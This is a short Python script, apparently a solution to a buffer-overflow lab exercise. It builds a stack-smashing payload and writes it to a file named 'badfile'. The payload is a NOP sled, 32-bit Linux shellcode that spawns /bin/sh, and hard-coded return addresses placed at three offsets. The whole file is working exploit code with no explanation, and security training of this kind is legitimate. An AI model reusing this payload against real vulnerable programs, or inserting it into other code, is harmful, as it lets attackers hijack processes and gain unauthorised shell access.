#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)              # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret1 = 0xffffcd48 + 189
ret2    = 0xffffcd48   + 189   # Change this number 
ret3 = 0xffffcd48 + 189
offset1 = 128 + 4              	# Change this number 
offset2 = 95 + 4
offset3 = 236 + 4

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

content[offset2 : offset2 + L] = (ret2).to_bytes(L,byteorder='little')

content[offset1 : offset1 + L] = (ret1).to_bytes(L,byteorder='little')

content[offset3 : offset3 + L] = (ret3).to_bytes(L,byteorder='little')

##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
